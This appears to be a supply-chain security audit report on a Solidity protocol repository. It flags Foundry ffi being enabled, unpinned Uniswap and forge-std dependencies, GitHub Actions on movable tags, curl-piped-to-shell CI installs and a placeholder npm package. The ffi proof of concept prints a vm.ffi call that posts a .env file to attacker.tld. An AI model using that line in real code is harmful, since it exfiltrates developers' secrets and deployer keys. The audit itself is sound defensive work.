findings.title: foundry.toml sets ffi = true with shell hooks (arbitrary build-time exec)
findings.description: protocol/foundry.toml line 33 sets `ffi = true` in [profile.default]. The Foundry FFI cheatcode lets any test or build helper invoke arbitrary shell commands on the build machine via `vm.ffi(...)`. The repository also ships executable shell scripts (.husky/pre-commit, post-commit, post-update, pre-push) and npm/yarn lifecycle scripts (root package.json `bootstrap`/`generate`/`build`, protocol package.json `generate`/`test`), so the host environment that runs the build already executes project-controlled scripts. Combined with broad `fs_permissions` granting read access to the entire parent directory (`{ access = "read", path = "../" }`), a compromised dependency or test helper that reaches an ffi call can read source/secrets and execute commands. Per the patient-zero threat model, the capability itself is the finding: a single tampered test or library file under contracts/test compiled with this profile can run shell commands during `forge test`/`forge build` on a developer or CI machine, before any auditor sees final bytecode. The [profile.audit] profile does NOT carry ffi, but the default profile (used for normal builds/tests) does.
findings.impact: A tampered dependency or test/build helper can execute arbitrary shell commands on developer/CI machines during `forge test` or `forge build` under the default profile, enabling secret exfiltration (the FORKING_RPC / ANVIL_FORK_URL secret, deployer keys in .env) or injection of code into build artifacts before review.
findings.proof_of_concept: Any Solidity file compiled under [profile.default] can call `string[] memory cmd = new string[](3); cmd[0] = "bash"; cmd[1] = "-c"; cmd[2] = "curl attacker.tld -d @../protocol/.env"; vm.ffi(cmd);`. Because ffi=true is set globally for the default profile, no per-test opt-in is required.
findings.recommendation: Set `ffi = false` in [profile.default]; only enable ffi in a dedicated, clearly named profile that is never the default and is used solely for the specific tests that require it. Tighten `fs_permissions` to the minimal directories actually needed instead of `../`. Document which tests legitimately require ffi and review them line by line.
findings.human_review_reason: Supply chain finding (SC-*). The ffi capability is unambiguous, but whether any shipped test/helper actually abuses it, and the operational risk of removing it, require human judgment about developer intent and CI configuration.

ice_chain.consumer_action: executes arbitrary shell commands via vm.ffi during compilation/testing

findings.title: Uniswap deps resolve to git branch #0.8, not pinned commits
findings.description:
protocol/package.json lists two production dependencies as git URLs pinned to a moving branch ref rather than an immutable commit:
  - "@uniswap/v3-core": "https://github.com/Uniswap/v3-core.git#0.8"
  - "@uniswap/v3-periphery": "https://github.com/Uniswap/v3-periphery#0.8"
The `#0.8` suffix is a branch (not a tag and not a 40-char commit SHA). Any force-push or new commit to the `0.8` branch of those repos changes what gets installed on the next clean `yarn install` for anyone not protected by the lockfile. `@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol` is imported into production Beanstalk oracle code (LibUniswapOracle / oracle path), so a change to that branch flows directly into compiled protocol bytecode. While yarn.lock currently freezes a resolution, branch-based git deps are non-reproducible by design and bypass npm registry integrity/scanning. This is the classic patient-zero vector: upstream-branch tampering reaches a fresh build before review.
findings.impact: A compromise or force-push of the Uniswap `0.8` branch (or a maintainer-account takeover) silently changes the OracleLibrary / TWAP math compiled into Beanstalk on the next clean install, potentially altering on-chain price logic that the protocol depends on for oracle reads.
findings.recommendation: Pin both Uniswap dependencies to a full 40-character commit SHA (e.g. `Uniswap/v3-core#<sha>`) or to a published, immutable npm release of @uniswap/v3-core / @uniswap/v3-periphery. Verify yarn.lock contains a git commit hash, not a branch resolution, and treat lockfile changes to these entries as security-relevant in review.
findings.human_review_reason: Supply chain finding (SC-*). Whether the lockfile adequately freezes the branch resolution for the actual build process, and whether OracleLibrary is in audit scope, require human verification.

findings.title: GitHub Actions pinned to moving tags, not commit SHAs (incl. third-party)
findings.description:
Every action reference under .github/workflows/ is pinned to a moving major/minor tag rather than a full commit SHA. First-party actions use `actions/checkout@v3`, `actions/setup-node@v3`, `actions/cache@v3` (and `@v2` in main.off). More importantly, two third-party actions are referenced by movable tag:
  - `stefanzweifel/git-auto-commit-action@v4` (ci.protocol.yaml) — this action runs with write access and commits to the PR branch.
  - `mskri/check-uncommitted-changes-action@v1.0.1` (the four subgraph workflows).
Tags can be repointed by the action author (or by an attacker who compromises the action's repo). The git-auto-commit action in particular has `contents: write` semantics and pushes commits to `${{ github.head_ref }}`, so a malicious update to that tag could inject commits or run arbitrary code in CI. This is an unsigned/unpinned-Actions supply-chain exposure per the patient-zero model.

location.code_snippet:
- name: Commit changes
  uses: stefanzweifel/git-auto-commit-action@v4
  with:
    commit_message: prettier auto formatting changes
    branch: ${{ github.head_ref }}

findings.impact: If a referenced action's tag is repointed to malicious code (author compromise or tag mutation), CI runs attacker-controlled code with repository write permissions and access to CI secrets (ANVIL_FORK_URL / FORKING_RPC), enabling commit injection into PR branches and secret theft.
findings.recommendation: Pin all actions — first-party and especially third-party — to a full commit SHA (e.g. `actions/checkout@<40-char-sha>`, `stefanzweifel/git-auto-commit-action@<sha>`). Add a comment with the human-readable tag next to each SHA. Restrict workflow `permissions:` to least privilege and scope the git-auto-commit step to the minimum needed.
findings.human_review_reason: Supply chain finding (SC-*). Acceptable-risk assessment for first-party GitHub actions vs. third-party write-capable actions, and CI threat model, require human judgment.

ice_chain.consumer_action: executes action code with repo write access and secret access

findings.title: CI pipes remote installer to shell: curl https://sh.rustup.rs | sh
findings.description:
Three workflows install Rust by piping a remote script straight into a shell with no integrity verification:
  - .github/workflows/ci.sdk.yaml line 28
  - .github/workflows/ci.sdk-core.yaml line 28
  - .github/workflows/ci.sdk-wells.yaml line 30
Each runs `curl https://sh.rustup.rs -sSf | sh -s -- -y`. The fetched content is executed unconditionally; there is no checksum, signature, or version pin on the installer. If sh.rustup.rs (or a CDN/TLS-MITM path) serves tampered content, arbitrary code runs on the CI runner with access to repository secrets. These jobs also run `yarn build` / `yarn anvil4tests`, so a poisoned toolchain step can taint downstream build artifacts. This matches the agent rule: `curl` piped to `sh` is a remote-code-execution build pattern.

location.code_snippet:
- name: Install Rust (Stable)
  run: curl https://sh.rustup.rs -sSf | sh -s -- -y

findings.impact: A compromised or MITM'd rustup installer executes arbitrary code on the CI runner, with access to CI secrets (FORKING_RPC / ANVIL_FORK_URL) and the ability to inject code into build outputs produced later in the same job.
findings.recommendation: Prefer the maintained `actions/setup-rust` / `dtolnay/rust-toolchain` action pinned to a commit SHA, or download the rustup-init binary and verify its published SHA-256 before execution rather than piping curl output directly into a shell.
findings.human_review_reason: Supply chain finding (SC-*). These jobs are for SDK projects rather than the on-chain protocol; human should judge whether they share secrets/artifacts with protocol builds and the real exposure.

findings.title: forge-std submodule and several deps lack immutable pins
findings.description:
Multiple dependencies are not pinned to immutable, verifiable references:
  - .gitmodules declares the forge-std submodule with `url = https://github.com/foundry-rs/forge-std` and NO `branch =` directive. The working tree has forge-std checked out at commit b3bc8b1 ("Update CODEOWNERS #866"), which `git tag --points-at HEAD` shows is NOT a release tag. forge-std is also listed in protocol/package.json as `"forge-std": "^1.1.2"` (caret = floating minor/patch), so the test library is sourced two ways with neither pinned to a verified release tag.
  - protocol/package.json `"@beanstalk/wells1.1": "npm:@beanstalk/wells@1.1.0-prerelease0"` resolves to a PRERELEASE build, and `@wells/` is remapped into production Solidity via remappings.txt (`@wells/=node_modules/@beanstalk/wells1.1/`). Prerelease artifacts are mutable/unstable and are imported into compiled contracts.
  - protocol/package.json `"@prb/math": "v2.5.0"` uses a `v`-prefixed tag string (works, but is a tag rather than a registry semver pin and `@prb/math/contracts/PRBMath.sol` is imported into production code).
None of these is from an untrusted source, so this is Medium (loose pin on otherwise-trusted libraries), but each weakens build reproducibility and lets an upstream change reach a fresh build.
findings.impact: Builds are not byte-reproducible from source control alone: a fresh clone + install can pick up a different forge-std commit, a re-published wells prerelease, or a moved @prb/math tag. forge-std is test-only (lower runtime risk), but @wells and @prb/math compile into production bytecode, so an upstream change there silently alters deployed code.
findings.recommendation: Add an explicit pinned commit for the forge-std submodule (commit the gitlink and, ideally, a `branch =` or document the exact SHA) and a verified release tag (e.g. v1.x.y) rather than a floating CODEOWNERS commit. Replace `^1.1.2` with an exact version. Pin `@beanstalk/wells1.1` to a stable, immutable release instead of `-prerelease0`. Pin `@prb/math` to an exact registry version. Verify yarn.lock freezes all of these to content hashes.
findings.human_review_reason: Supply chain finding (SC-*). forge-std is test-only and @beanstalk/wells is a first-party org package; human should weigh actual risk of the prerelease pin and whether the wells code is in audit scope.

findings.title: Ambiguous bare 'uniswap@^0.0.1' npm dep (dependency-confusion vector)
findings.description: protocol/package.json dependencies include a bare, near-empty package `"uniswap": "^0.0.1"` (line 66) sitting next to the legitimately-scoped `@uniswap/v3-core` and `@uniswap/v3-periphery` git deps. The unscoped `uniswap` package on the public registry is a 0.0.x placeholder with no meaningful code and no relationship to Uniswap Labs' scoped packages. Having an unscoped, sub-1.0, caret-ranged dependency named after a major protocol is a dependency-confusion / namespace-ambiguity signal: it is not the package the protocol actually needs (the real code comes from the `@uniswap/*` scope), it serves no clear purpose, and a `^0.0.1` range plus a placeholder package is exactly the kind of low-trust entry an attacker could later co-opt or that could shadow an intended internal name. No malicious behavior is confirmed in the pinned resolution; this is flagged as an ambiguous/low-trust dependency requiring human disposition (remove if unused).
findings.impact: An unused, unscoped placeholder package with a floating sub-1.0 range increases the dependency attack surface (dependency confusion / future package takeover) without providing functionality; if it ever resolves to attacker-controlled content it executes within the install/build of the protocol package.
findings.recommendation: Remove the bare `uniswap` dependency if it is unused (the protocol imports `@uniswap/v3-core` / `@uniswap/v3-periphery`, not `uniswap`). If something genuinely requires it, pin it to an exact, audited version and document why it is needed.
findings.human_review_reason: Supply chain finding (SC-*). Cannot confirm from source whether `uniswap` is actually used anywhere; human must verify it is dead weight before removal and assess registry-takeover risk.

ice_chain.consumer_action: installs an ambiguous placeholder package with a floating range
